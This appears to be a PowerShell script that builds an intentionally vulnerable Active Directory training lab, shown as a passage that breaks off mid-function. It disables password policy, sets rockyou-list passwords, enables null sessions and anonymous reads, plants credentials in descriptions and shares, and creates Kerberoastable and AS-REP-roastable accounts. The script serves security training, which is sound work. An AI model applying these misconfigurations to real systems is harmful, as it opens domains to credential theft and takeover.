#Requires -RunAsAdministrator
<#
.SYNOPSIS
    AD-Playground  -  Interactive Vulnerable Active Directory Lab Environment
.DESCRIPTION
    A single-script lab that transforms any Windows Server into a fully
    populated, intentionally vulnerable Active Directory environment for
    red team practice. Supports individual technique labs and chained
    attack scenarios.
.NOTES
    Author  : AD-Playground Project
    Version : 1.0.0
    Requires: Windows Server 2016/2019/2022, Run as Administrator
#>

Set-StrictMode -Off
$ErrorActionPreference = "SilentlyContinue"

# ── Console encoding  -  required for Unicode box/block chars on WS 2016 ──────
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding           = [System.Text.Encoding]::UTF8
chcp 65001 | Out-Null

# ── Module imports ────────────────────────────────────────────────────────────
foreach ($mod in @("ActiveDirectory","GroupPolicy","DnsServer")) {
    if (-not (Get-Module -Name $mod)) {
        Import-Module $mod -ErrorAction SilentlyContinue
    }
}

# ─────────────────────────────────────────────────────────────────────────────
#  GLOBAL CONFIG
# ─────────────────────────────────────────────────────────────────────────────
$Global:ADPConfig = @{
    Version      = "1.0.0"
    StateFile    = "$PSScriptRoot\adp_state.json"
    Domain       = $null
    DomainDN     = $null
    # All passwords are confirmed present in rockyou.txt (or crackable with
    # hashcat best64 rules). Difficulty varies intentionally across accounts.
    BasePwd      = "Password1"        # rockyou ✓   -  regular employees
    WeakPwd      = "Password123"      # rockyou ✓   -  spray target baseline
    ServicePwd   = "Monkey1"          # rockyou ✓   -  service accounts (medium)
}

$Global:ADPState = @{
    BaselineReady  = $false
    ActiveLabs     = [System.Collections.ArrayList]@()   # must be ArrayList  -  fixed arrays have no .Add()
    DeployedAt     = @{}
    ScenarioChain7 = @()   # Speed Run chain persisted so Teardown works after script restart
}

# ─────────────────────────────────────────────────────────────────────────────
#  UI HELPERS
# ─────────────────────────────────────────────────────────────────────────────
function Write-Color {
    param(
        [string]$Text,
        [ConsoleColor]$Color = "White",
        [switch]$NoNewline
    )
    if ($NoNewline) { Write-Host $Text -ForegroundColor $Color -NoNewline }
    else            { Write-Host $Text -ForegroundColor $Color }
}

function Write-Banner {
    Clear-Host

    # ANSI Shadow figlet for "AD-PLAY" — every line is now the same width.
    # The trailing spaces on each line ensure the right edges are uniform,
    # which is what makes the ║ box edge render symmetrically.
    $art = @(
        " █████╗ ██████╗       ██████╗ ██╗      █████╗ ██╗   ██╗ ",
        "██╔══██╗██╔══██╗      ██╔══██╗██║     ██╔══██╗╚██╗ ██╔╝ ",
        "███████║██║  ██║█████╗██████╔╝██║     ███████║ ╚████╔╝  ",
        "██╔══██║██║  ██║╚════╝██╔═══╝ ██║     ██╔══██║  ╚██╔╝   ",
        "██║  ██║██████╔╝      ██║     ███████╗██║  ██║   ██║    ",
        "╚═╝  ╚═╝╚═════╝       ╚═╝     ╚══════╝╚═╝  ╚═╝   ╚═╝    "
    )
    $tag1 = "Vulnerable Active Directory Lab Suite"
    $tag2 = "Red Team Training Platform  |  v1.0"

    # Inner width is the longest line + 6 chars margin on each side
    $artMax = ($art | Measure-Object -Property Length -Maximum).Maximum
    $tagMax = [math]::Max($tag1.Length, $tag2.Length)
    $inner  = [math]::Max($artMax, $tagMax) + 8   # 4-char gutter each side
    $bar    = "═" * $inner

    function Write-BannerLine {
        param([string]$Text, [ConsoleColor]$Color = "White")
        $padTotal = $inner - $Text.Length
        $padL = [math]::Floor($padTotal / 2)
        $padR = $padTotal - $padL
        Write-Color "  ║" Cyan -NoNewline
        Write-Color (" " * $padL) -NoNewline
        Write-Color $Text $Color -NoNewline
        Write-Color (" " * $padR) -NoNewline
        Write-Color "║" Cyan
    }

    Write-Color "  ╔$bar╗" Cyan
    Write-BannerLine ""
    foreach ($line in $art) { Write-BannerLine $line Red }
    Write-BannerLine ""
    Write-BannerLine $tag1 Yellow
    Write-BannerLine $tag2 DarkGray
    Write-BannerLine ""
    Write-Color "  ╚$bar╝" Cyan
    Write-Host ""
}

function Write-SectionHeader {
    param([string]$Title)
    Write-Host ""
    Write-Color "  ┌─────────────────────────────────────────────┐" DarkCyan
    Write-Color "  │  " DarkCyan -NoNewline
    Write-Color $Title.PadRight(43) Yellow -NoNewline
    Write-Color "│" DarkCyan
    Write-Color "  └─────────────────────────────────────────────┘" DarkCyan
    Write-Host ""
}

function Write-MenuItem {
    param([string]$Key, [string]$Label, [ConsoleColor]$KeyColor = "Green", [string]$Tag = "")
    Write-Color "    [" DarkGray -NoNewline
    Write-Color $Key $KeyColor -NoNewline
    Write-Color "] " DarkGray -NoNewline
    Write-Color $Label White -NoNewline
    if ($Tag) {
        Write-Color "  " -NoNewline
        Write-Color $Tag DarkYellow
    } else { Write-Host "" }
}

function Write-Status {
    param([string]$Msg, [string]$Type = "INFO")
    # Explicit if/else avoids the switch-scope ambiguity on PS 5.1
    if     ($Type -eq "OK")   { $prefix = "[+]"; $col = [ConsoleColor]::Green    }
    elseif ($Type -eq "FAIL") { $prefix = "[-]"; $col = [ConsoleColor]::Red      }
    elseif ($Type -eq "WARN") { $prefix = "[!]"; $col = [ConsoleColor]::Yellow   }
    elseif ($Type -eq "WORK") { $prefix = "[*]"; $col = [ConsoleColor]::Cyan     }
    else                      { $prefix = "[i]"; $col = [ConsoleColor]::DarkGray }
    Write-Color "  $prefix " $col -NoNewline
    Write-Color $Msg White
}

function Pause-Menu {
    Write-Host ""
    Write-Color "  Press any key to continue..." DarkGray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
}

function Get-MenuChoice {
    param([string]$Prompt = "Select")
    Write-Host ""
    Write-Color "  $Prompt" DarkCyan -NoNewline
    Write-Color " > " Yellow -NoNewline
    return (Read-Host)
}

function Show-ActiveLabs {
    if ($Global:ADPState.ActiveLabs.Count -eq 0) {
        Write-Color "    None" DarkGray
    } else {
        foreach ($lab in $Global:ADPState.ActiveLabs) {
            $ts = $Global:ADPState.DeployedAt[$lab]
            Write-Color "    • " Green -NoNewline
            Write-Color $lab White -NoNewline
            Write-Color "  (deployed $ts)" DarkGray
        }
    }
}

# ─────────────────────────────────────────────────────────────────────────────
#  STATE MANAGEMENT
# ─────────────────────────────────────────────────────────────────────────────
function Save-State {
    $Global:ADPState | ConvertTo-Json -Depth 5 | Set-Content $Global:ADPConfig.StateFile -Encoding UTF8
}

function Load-State {
    if (Test-Path $Global:ADPConfig.StateFile) {
        try {
            $loaded = Get-Content $Global:ADPConfig.StateFile -Raw | ConvertFrom-Json
            $Global:ADPState.BaselineReady = [bool]$loaded.BaselineReady
            # Guard against null ActiveLabs in JSON  -  null would add a null element to the list
            if ($loaded.ActiveLabs) {
                $Global:ADPState.ActiveLabs = [System.Collections.ArrayList]@($loaded.ActiveLabs)
            } else {
                $Global:ADPState.ActiveLabs = [System.Collections.ArrayList]@()
            }
            $h = @{}
            if ($loaded.DeployedAt) {
                $loaded.DeployedAt.PSObject.Properties | ForEach-Object { $h[$_.Name] = $_.Value }
            }
            $Global:ADPState.DeployedAt = $h
            # Restore persisted Speed Run chain so Teardown-Scenario 7 works after restart
            if ($loaded.ScenarioChain7) {
                $Global:ADPState.ScenarioChain7 = @($loaded.ScenarioChain7)
            }
        } catch {
            # Corrupt state file  -  start fresh
            $Global:ADPState.ActiveLabs = [System.Collections.ArrayList]@()
            $Global:ADPState.DeployedAt = @{}
        }
    }
}

function Add-ActiveLab {
    param([string]$Name)
    if ($Global:ADPState.ActiveLabs -notcontains $Name) {
        [void]$Global:ADPState.ActiveLabs.Add($Name)
        $Global:ADPState.DeployedAt[$Name] = (Get-Date -Format "yyyy-MM-dd HH:mm")
        Save-State
    }
}

function Remove-ActiveLab {
    param([string]$Name)
    [void]$Global:ADPState.ActiveLabs.Remove($Name)
    $Global:ADPState.DeployedAt.Remove($Name)
    Save-State
}

function Assert-Baseline {
    if (-not $Global:ADPState.BaselineReady) {
        Write-Status "Baseline not set up. Run option [1] from the main menu first." WARN
        Pause-Menu
        return $false
    }
    # Refresh domain info
    try {
        $dom = Get-ADDomain
        $Global:ADPConfig.Domain   = $dom.DNSRoot
        $Global:ADPConfig.DomainDN = $dom.DistinguishedName
    } catch {
        Write-Status "Cannot reach AD. Is this a Domain Controller?" FAIL
        Pause-Menu
        return $false
    }
    return $true
}

# ─────────────────────────────────────────────────────────────────────────────
#  BASELINE  -  AD DS INSTALL + USER POPULATION
# ─────────────────────────────────────────────────────────────────────────────
function Invoke-BaselineSetup {
    Write-Banner
    Write-SectionHeader "Baseline Setup"

    # Check if already a DC
    $adws = Get-Service -Name "ADWS" -ErrorAction SilentlyContinue
    if ($adws -and $adws.Status -eq "Running") {
        Write-Status "Active Directory is already running on this machine." OK
        $dom = Get-ADDomain
        $Global:ADPConfig.Domain   = $dom.DNSRoot
        $Global:ADPConfig.DomainDN = $dom.DistinguishedName
        Write-Status "Domain: $($Global:ADPConfig.Domain)" OK
    } else {
        Write-Status "Active Directory Domain Services not detected." WARN
        Write-Host ""
        Write-Color "  This will install AD DS and promote this server to a Domain Controller." Yellow
        Write-Host ""
        $domName = Get-MenuChoice "Enter domain name (e.g. corp.local)"
        if (-not $domName) { $domName = "corp.local" }
        $safePwd = Read-Host "  Enter DSRM password" -AsSecureString

        Write-Status "Installing AD DS role..." WORK
        Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools | Out-Null

        Write-Status "Promoting to Domain Controller for $domName ..." WORK
        Install-ADDSForest `
            -DomainName $domName `
            -DomainNetbiosName ($domName.Split(".")[0].ToUpper()) `
            -SafeModeAdministratorPassword $safePwd `
            -InstallDns `
            -Force `
            -NoRebootOnCompletion | Out-Null

        $Global:ADPConfig.Domain   = $domName
        $Global:ADPConfig.DomainDN = "DC=" + ($domName -replace "\.", ",DC=")
        Write-Status "AD DS installed. A reboot is required to complete promotion." WARN
        Write-Status "After reboot, re-run this script and choose [1] again to populate users." INFO
        Pause-Menu
        return
    }

    Write-Host ""
    Write-Status "Disabling password complexity policy (required for weak rockyou passwords)..." WORK
    Disable-PasswordComplexityPolicy
    Write-Host ""
    Write-Status "Populating AD with realistic users, groups, and OUs..." WORK
    Invoke-UserPopulation
    $Global:ADPState.BaselineReady = $true
    Save-State
    Write-Host ""
    Write-Status "Baseline complete. Domain: $($Global:ADPConfig.Domain)" OK
    Pause-Menu
}

function Repair-WeakPasswords {
    <#
    .SYNOPSIS Re-applies the weak rockyou.txt passwords to all special users.
    .NOTES    Use this if a baseline was deployed BEFORE the complexity-policy
              fix was added - those users will have empty NT hashes and the
              Kerberoasting / spray / PTH labs will not work until passwords
              are re-set. Disables complexity policy first, then resets each pwd.
    #>
    Disable-PasswordComplexityPolicy

    $repairs = @(
        @{ sam="svc_backup";   pwd="Monkey1"   }
        @{ sam="svc_sql";      pwd="dragon"    }
        @{ sam="svc_web";      pwd="sunshine"  }
        @{ sam="svc_scan";     pwd="iloveyou"  }
        @{ sam="helpdesk01";   pwd="Password1" }
        @{ sam="itadmin";      pwd="letmein"   }
        @{ sam="jdoe_legacy";  pwd="Welcome1"  }
        @{ sam="svc_legacy";   pwd="abc123"    }
        @{ sam="analyst01";    pwd="Password1" }
        @{ sam="dbadmin";      pwd="trustno1"  }
        @{ sam="lab_localadmin"; pwd="football" }
    )

    $fixed = 0
    foreach ($r in $repairs) {
        $user = Get-ADUser -Identity $r.sam -ErrorAction SilentlyContinue
        if (-not $user) { continue }
        try {
            Set-ADAccountPassword -Identity $r.sam -Reset `
                -NewPassword (ConvertTo-SecureString $r.pwd -AsPlainText -Force) `
                -ErrorAction Stop
            Set-ADUser -Identity $r.sam -PasswordNeverExpires $true -Enabled $true -ErrorAction SilentlyContinue
            Write-Status "Reset $($r.sam) password to '$($r.pwd)'" OK
            $fixed++
        } catch {
            Write-Status "Could not reset $($r.sam): $_" FAIL
        }
    }
    Write-Status "Repair complete. $fixed accounts re-keyed." OK
}

function Disable-PasswordComplexityPolicy {
    <#
    .SYNOPSIS Disables password complexity + length policy so weak rockyou.txt
              passwords (dragon, sunshine, letmein, abc123, etc.) can be set.
    .NOTES    Without this, New-ADUser silently fails to set the password while
              still creating the account, leaving service accounts with empty NT
              hash (31d6cfe0d16ae931b73c59d7e0c089c0) which breaks Kerberoasting,
              password spraying, and PTH labs.
    #>
    try {
        # Layer 1: Modify LDAP domain attributes directly (takes effect immediately)
        $dom = Get-ADDomain
        Set-ADDefaultDomainPasswordPolicy -Identity $dom.DistinguishedName `
            -ComplexityEnabled $false `
            -MinPasswordLength 1 `
            -PasswordHistoryCount 0 `
            -ReversibleEncryptionEnabled $false `
            -MaxPasswordAge ([System.TimeSpan]::FromDays(0)) `
            -MinPasswordAge ([System.TimeSpan]::FromDays(0)) `
            -ErrorAction SilentlyContinue
    } catch {}

    # Layer 2: Apply via secedit + Local Security Authority so DC enforces it now
    $cfgPath = "$env:TEMP\adp_secpol.inf"
    $dbPath  = "$env:TEMP\adp_secedit.sdb"
    $cfg = @"
[Unicode]
Unicode=yes
[System Access]
PasswordComplexity = 0
MinimumPasswordLength = 1
PasswordHistorySize = 0
MaximumPasswordAge = -1
MinimumPasswordAge = 0
[Version]
signature="`$CHICAGO`$"
Revision=1
"@
    [System.IO.File]::WriteAllText($cfgPath, $cfg, [System.Text.Encoding]::Unicode)
    secedit /configure /db $dbPath /cfg $cfgPath /areas SECURITYPOLICY /quiet 2>&1 | Out-Null
    gpupdate /force /target:computer 2>&1 | Out-Null
    Write-Status "Password complexity policy disabled." OK
}

function Invoke-UserPopulation {
    $dn = $Global:ADPConfig.DomainDN

    # ── OUs ──────────────────────────────────────────────────────────────────
    $ous = @("Employees","IT","HR","Finance","Sales","ServiceAccounts","Servers","Workstations","Legacy")
    foreach ($ou in $ous) {
        New-ADOrganizationalUnit -Name $ou -Path $dn -ProtectedFromAccidentalDeletion $false -ErrorAction SilentlyContinue
        Write-Status "OU: $ou" OK
    }

    # ── Groups ────────────────────────────────────────────────────────────────
    $groups = @{
        "Domain Admins"     = "CN=Builtin,$dn"   # existing, skip
        "IT-Admins"         = "OU=IT,$dn"
        "Help-Desk"         = "OU=IT,$dn"
        "HR-Staff"          = "OU=HR,$dn"
        "Finance-Staff"     = "OU=Finance,$dn"
        "Sales-Team"        = "OU=Sales,$dn"
        "Server-Admins"     = "OU=IT,$dn"
        "Backup-Operators-Custom" = "OU=IT,$dn"
    }
    foreach ($g in $groups.GetEnumerator()) {
        if ($g.Key -eq "Domain Admins") { continue }
        New-ADGroup -Name $g.Key -GroupScope Global -GroupCategory Security -Path $g.Value -ErrorAction SilentlyContinue
        Write-Status "Group: $($g.Key)" OK
    }

    # ── User data ─────────────────────────────────────────────────────────────
    $firstNames = @("James","Maria","Robert","Linda","Michael","Barbara","William","Patricia",
                    "David","Jennifer","Richard","Susan","Thomas","Jessica","Charles","Sarah",
                    "Daniel","Karen","Matthew","Lisa","Anthony","Nancy","Mark","Betty","Donald",
                    "Margaret","Paul","Sandra","Steven","Ashley","Andrew","Dorothy","Joshua","Emily")
    $lastNames  = @("Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis",
                    "Wilson","Martinez","Anderson","Taylor","Thomas","Jackson","White","Harris",
                    "Martin","Thompson","Moore","Young","Allen","King","Scott","Wright","Torres",
                    "Hill","Flores","Green","Adams","Nelson","Mitchell","Roberts","Carter","Phillips")
    $titles = @{
        IT      = @("Systems Administrator","Network Engineer","Security Analyst","Help Desk Technician","IT Manager")
        HR      = @("HR Specialist","Recruiter","HR Manager","Benefits Coordinator","Talent Acquisition")
        Finance = @("Financial Analyst","Accountant","Controller","Budget Analyst","CFO Assistant")
        Sales   = @("Account Executive","Sales Manager","Business Developer","Sales Rep","Regional Director")
    }

    $depts = @("IT","IT","HR","Finance","Sales","HR","Sales","Finance")
    $created = @{}

    for ($i = 0; $i -lt 34; $i++) {
        $fn   = $firstNames[$i]
        $ln   = $lastNames[$i]
        $sam  = "$($fn.Substring(0,1).ToLower())$($ln.ToLower())"
        $dept = $depts[$i % $depts.Count]
        $ou   = "OU=Employees,$dn"
        $title = $titles[$dept][$i % $titles[$dept].Count]

        $params = @{
            Name                  = "$fn $ln"
            GivenName             = $fn
            Surname               = $ln
            SamAccountName        = $sam
            UserPrincipalName     = "$sam@$($Global:ADPConfig.Domain)"
            Path                  = $ou
            AccountPassword       = (ConvertTo-SecureString $Global:ADPConfig.BasePwd -AsPlainText -Force)
            Enabled               = $true
            Department            = $dept
            Title                 = $title
            PasswordNeverExpires  = $true
            ErrorAction           = "SilentlyContinue"
        }
        New-ADUser @params
        $created[$sam] = $dept
        Write-Status "User: $sam ($dept)" OK
    }

    # A few users with intentionally weak/notable properties (used by labs)
    # SPNs reference the actual domain, not hardcoded "corp.local"
    $domDns = $Global:ADPConfig.Domain
    $specialUsers = @(
        # Passwords chosen to be crackable with rockyou.txt at varying difficulties.
        # Password complexity policy is DISABLED at baseline so these all set correctly.
        @{ sam="svc_backup";   name="Backup Service";   pwd="Monkey1";   ou="OU=ServiceAccounts,$dn"; spn="HOST/backup01" }
        @{ sam="svc_sql";      name="SQL Service";      pwd="dragon";    ou="OU=ServiceAccounts,$dn"; spn="MSSQLSvc/sql01.$domDns`:1433" }
        @{ sam="svc_web";      name="Web Service";      pwd="sunshine";  ou="OU=ServiceAccounts,$dn"; spn="HTTP/web01.$domDns" }
        @{ sam="svc_scan";     name="Scanner Service";  pwd="iloveyou";  ou="OU=ServiceAccounts,$dn"; spn="" }
        @{ sam="helpdesk01";   name="Help Desk 01";     pwd="Password1"; ou="OU=IT,$dn";              spn="" }
        @{ sam="itadmin";      name="IT Admin";         pwd="letmein";   ou="OU=IT,$dn";              spn="" }
        @{ sam="jdoe_legacy";  name="John Doe Legacy";  pwd="Welcome1";  ou="OU=Legacy,$dn";          spn="" }
        @{ sam="svc_legacy";   name="Legacy Service";   pwd="abc123";    ou="OU=Legacy,$dn";          spn="" }
        @{ sam="analyst01";    name="SOC Analyst 01";   pwd="Password1"; ou="OU=IT,$dn";              spn="" }
        @{ sam="dbadmin";      name="DB Admin";         pwd="trustno1";  ou="OU=IT,$dn";              spn="" }
    )
    foreach ($u in $specialUsers) {
        $secPwd = ConvertTo-SecureString $u.pwd -AsPlainText -Force
        $params = @{
            Name                 = $u.name
            SamAccountName       = $u.sam
            UserPrincipalName    = "$($u.sam)@$($Global:ADPConfig.Domain)"
            Path                 = $u.ou
            AccountPassword      = $secPwd
            Enabled              = $true
            PasswordNeverExpires = $true
            ErrorAction          = "SilentlyContinue"
        }
        New-ADUser @params

        # Always reset the password explicitly — handles both new-creation (where
        # weak passwords may have been silently rejected) and existing-user reruns.
        # This is the actual fix for the "empty NT hash" bug.
        Set-ADAccountPassword -Identity $u.sam -Reset -NewPassword $secPwd -ErrorAction SilentlyContinue
        Set-ADUser -Identity $u.sam -PasswordNeverExpires $true -Enabled $true -ErrorAction SilentlyContinue

        if ($u.spn -ne "") {
            Set-ADUser -Identity $u.sam -ServicePrincipalNames @{Add=$u.spn} -ErrorAction SilentlyContinue
        }
        Write-Status "Special user: $($u.sam) (pwd: $($u.pwd))" OK
    }

    # Group memberships
    Add-ADGroupMember -Identity "IT-Admins"    -Members "itadmin","helpdesk01" -ErrorAction SilentlyContinue
    Add-ADGroupMember -Identity "Help-Desk"    -Members "helpdesk01" -ErrorAction SilentlyContinue
    Add-ADGroupMember -Identity "Server-Admins"-Members "itadmin","svc_backup" -ErrorAction SilentlyContinue
    Add-ADGroupMember -Identity "Backup-Operators-Custom" -Members "svc_backup" -ErrorAction SilentlyContinue

    Write-Status "User population complete. $(34 + $specialUsers.Count) users created." OK
}

# ─────────────────────────────────────────────────────────────────────────────
#  LAB ENGINE HELPERS
# ─────────────────────────────────────────────────────────────────────────────
function Get-DomainDN {
    return (Get-ADDomain).DistinguishedName
}

function ConvertTo-GPPCPassword {
    <#
    .SYNOPSIS Encrypts a plaintext string using the public MS GPP AES-256-CBC key.
    .NOTES    The key and IV (all zeros) are published in MS14-025. Any instance of this
              cpassword value is trivially decryptable by any attacker with gpp-decrypt.
    #>
    param([string]$Plaintext)
    try {
        # Published MS GPP AES key (MS14-025)
        $key = [byte[]](0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                         0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
        $iv    = New-Object byte[] 16   # all zeros
        $bytes = [System.Text.Encoding]::Unicode.GetBytes($Plaintext)
        # PKCS7-pad to the next 16-byte boundary
        $pad   = 16 - ($bytes.Length % 16)
        if ($pad -eq 0) { $pad = 16 }
        $padded = $bytes + [byte[]](@($pad) * $pad)
        $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        $aes.Key     = $key
        $aes.IV      = $iv
        $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
        $ct  = $aes.CreateEncryptor().TransformFinalBlock($padded, 0, $padded.Length)
        $aes.Dispose()
        return [Convert]::ToBase64String($ct)
    } catch {
        Write-Status "GPP encryption failed: $_" WARN
        return $null
    }
}

function Show-LabHints {
    param([string]$LabName, [string[]]$Hints)
    Write-Banner
    Write-SectionHeader "Hints  -  $LabName"
    $i = 1
    foreach ($h in $Hints) {
        Write-Host ""
        Write-Color "  Hint $i" Yellow -NoNewline
        Write-Color " : $h" White
        $i++
    }
    Pause-Menu
}

function Invoke-LabValidation {
    param([string]$LabName, [scriptblock]$CheckBlock)
    Write-Host ""
    Write-Status "Validating lab: $LabName ..." WORK
    $result = & $CheckBlock
    if ($result) {
        Write-Host ""
        Write-Color "  ╔══════════════════════════════════════╗" Green
        Write-Color "  ║    LAB VALIDATED  -  WELL DONE!        ║" Green
        Write-Color "  ╚══════════════════════════════════════╝" Green
    } else {
        Write-Status "Validation not yet passed. Keep going!" WARN
    }
    Pause-Menu
}

# ─────────────────────────────────────────────────────────────────────────────
#  ══════════════════════  ENUMERATION LABS  ═══════════════════════════════
# ─────────────────────────────────────────────────────────────────────────────

# E1  -  LDAP Null / Authenticated Enumeration
function Deploy-Lab-E1 {
    $dn = Get-DomainDN
    Write-Status "Enabling LDAP null session (pre-Win2003 compat)..." WORK
    # Allow anonymous LDAP reads on specific OUs
    $aclPath = "AD:\OU=Employees,$dn"
    $acl = Get-Acl $aclPath
    $everyone = [System.Security.Principal.SecurityIdentifier]"S-1-1-0"
    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $everyone,
        [System.DirectoryServices.ActiveDirectoryRights]::GenericRead,
        [System.Security.AccessControl.AccessControlType]::Allow
    )
    $acl.AddAccessRule($rule)
    Set-Acl -Path $aclPath -AclObject $acl -ErrorAction SilentlyContinue
    # Set a user with password in description
    Set-ADUser -Identity "jdoe_legacy" -Description "Temp pwd: Welcome1 - change ASAP" -ErrorAction SilentlyContinue
    Add-ActiveLab "E1-LDAP-Enum"
    Write-Status "Lab E1 deployed. Target: jdoe_legacy has password in description." OK
}

function Teardown-Lab-E1 {
    $dn = Get-DomainDN
    $aclPath = "AD:\OU=Employees,$dn"
    $acl = Get-Acl $aclPath
    $everyone = [System.Security.Principal.SecurityIdentifier]"S-1-1-0"
    $acl.Access | Where-Object { $_.IdentityReference -like "*Everyone*" } | ForEach-Object {
        $acl.RemoveAccessRule($_) | Out-Null
    }
    Set-Acl -Path $aclPath -AclObject $acl -ErrorAction SilentlyContinue
    Set-ADUser -Identity "jdoe_legacy" -Clear description -ErrorAction SilentlyContinue
    Remove-ActiveLab "E1-LDAP-Enum"
    Write-Status "Lab E1 cleaned." OK
}

# E2  -  SMB Null Sessions & Share Enumeration
function Deploy-Lab-E2 {
    Write-Status "Configuring SMB for null session access..." WORK
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RestrictNullSessAccess" -Value 0 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "RestrictAnonymous" -Value 0 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "RestrictAnonymousSAM" -Value 0 -ErrorAction SilentlyContinue
    # Create a juicy open share
    $sharePath = "C:\ADPLab_Share"
    New-Item -ItemType Directory -Force -Path $sharePath | Out-Null
    "Domain Admin credentials - DO NOT SHARE" | Set-Content "$sharePath\admin_creds.txt" -Encoding UTF8
    "Server list for maintenance" | Set-Content "$sharePath\servers.txt" -Encoding UTF8
    New-SmbShare -Name "IT_Share" -Path $sharePath -FullAccess "Everyone" -ErrorAction SilentlyContinue
    Add-ActiveLab "E2-SMB-Enum"
    Write-Status "Lab E2 deployed. Share: \\localhost\IT_Share  -  null sessions enabled." OK
}

function Teardown-Lab-E2 {
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RestrictNullSessAccess" -Value 1 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "RestrictAnonymous" -Value 1 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "RestrictAnonymousSAM" -Value 1 -ErrorAction SilentlyContinue
    Remove-SmbShare -Name "IT_Share" -Force -ErrorAction SilentlyContinue
    Remove-Item -Recurse -Force "C:\ADPLab_Share" -ErrorAction SilentlyContinue
    Remove-ActiveLab "E2-SMB-Enum"
    Write-Status "Lab E2 cleaned." OK
}

# E3  -  SPN Enumeration
function Deploy-Lab-E3 {
    Write-Status "Setting up SPN enumeration targets..." WORK
    $domDns = $Global:ADPConfig.Domain
    # SPNs already set on svc_backup, svc_sql, svc_web during baseline
    # Add a few more on regular users (misconfigured)
    Set-ADUser -Identity "dbadmin" -ServicePrincipalNames @{Add="MSSQLSvc/db01:1433","MSSQLSvc/db01.$domDns`:1433"} -ErrorAction SilentlyContinue
    Set-ADUser -Identity "itadmin" -ServicePrincipalNames @{Add="RestrictedKrbHost/dc01"} -ErrorAction SilentlyContinue
    Add-ActiveLab "E3-SPN-Enum"
    Write-Status "Lab E3 deployed. SPNs set on: svc_sql, svc_web, svc_backup, dbadmin, itadmin." OK
}

function Teardown-Lab-E3 {
    $domDns = $Global:ADPConfig.Domain
    Set-ADUser -Identity "dbadmin" -ServicePrincipalNames @{Remove="MSSQLSvc/db01:1433","MSSQLSvc/db01.$domDns`:1433"} -ErrorAction SilentlyContinue
    Set-ADUser -Identity "itadmin" -ServicePrincipalNames @{Remove="RestrictedKrbHost/dc01"} -ErrorAction SilentlyContinue
    Remove-ActiveLab "E3-SPN-Enum"
    Write-Status "Lab E3 cleaned." OK
}

# E4  -  BloodHound / SharpHound Data Collection Setup
function Deploy-Lab-E4 {
    $dn = Get-DomainDN
    Write-Status "Creating complex ACL relationships for BloodHound analysis..." WORK
    # Help-Desk has GenericAll over a user
    $sid = (Get-ADGroup "Help-Desk").SID
    $target = Get-ADUser "analyst01" | Select-Object -ExpandProperty DistinguishedName
    $acl = Get-Acl "AD:\$target"
    $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $sid,
        [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
        [System.Security.AccessControl.AccessControlType]::Allow
    )
    $acl.AddAccessRule($rule)
    Set-Acl "AD:\$target" $acl -ErrorAction SilentlyContinue
    # IT-Admins has WriteDACL over Finance-Staff group
    $sidIT  = (Get-ADGroup "IT-Admins").SID
    $fgroup = Get-ADGroup "Finance-Staff" | Select-Object -ExpandProperty DistinguishedName
    $acl2   = Get-Acl "AD:\$fgroup"
    $rule2  = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $sidIT,
        [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl,
        [System.Security.AccessControl.AccessControlType]::Allow
    )
    $acl2.AddAccessRule($rule2)
    Set-Acl "AD:\$fgroup" $acl2 -ErrorAction SilentlyContinue
    Add-ActiveLab "E4-BloodHound-Setup"
    Write-Status "Lab E4 deployed. Run SharpHound and import into BloodHound to map the attack paths." OK
}

function Teardown-Lab-E4 {
    $target = Get-ADUser "analyst01" | Select-Object -ExpandProperty DistinguishedName
    $acl    = Get-Acl "AD:\$target"
    $sid    = (Get-ADGroup "Help-Desk").SID
    $acl.Access | Where-Object { $_.IdentityReference -match "Help-Desk" } | ForEach-Object { $acl.RemoveAccessRule($_) | Out-Null }
    Set-Acl "AD:\$target" $acl -ErrorAction SilentlyContinue
    $fgroup = Get-ADGroup "Finance-Staff" | Select-Object -ExpandProperty DistinguishedName
    $acl2   = Get-Acl "AD:\$fgroup"
    $acl2.Access | Where-Object { $_.IdentityReference -match "IT-Admins" } | ForEach-Object { $acl2.RemoveAccessRule($_) | Out-Null }
    Set-Acl "AD:\$fgroup" $acl2 -ErrorAction SilentlyContinue
    Remove-ActiveLab "E4-BloodHound-Setup"
    Write-Status "Lab E4 cleaned." OK
}

# E5  -  PowerView Target Setup
function Deploy-Lab-E5 {
    $dn = Get-DomainDN
    Write-Status "Creating PowerView-discoverable misconfigurations..." WORK
    # AdminCount=1 on non-admin user (AdminSDHolder artifact)
    Set-ADUser -Identity "helpdesk01" -Replace @{adminCount=1} -ErrorAction SilentlyContinue
    # User with no pre-auth (AS-REP candidate)
    Set-ADAccountControl -Identity "jdoe_legacy" -DoesNotRequirePreAuth $true -ErrorAction SilentlyContinue
    # User with password in description
    Set-ADUser -Identity "svc_legacy" -Description "Password: abc123" -ErrorAction SilentlyContinue
    Add-ActiveLab "E5-PowerView-Targets"
    Write-Status "Lab E5 deployed. PowerView targets: adminCount artefact, AS-REP user, creds in description." OK
}

function Teardown-Lab-E5 {
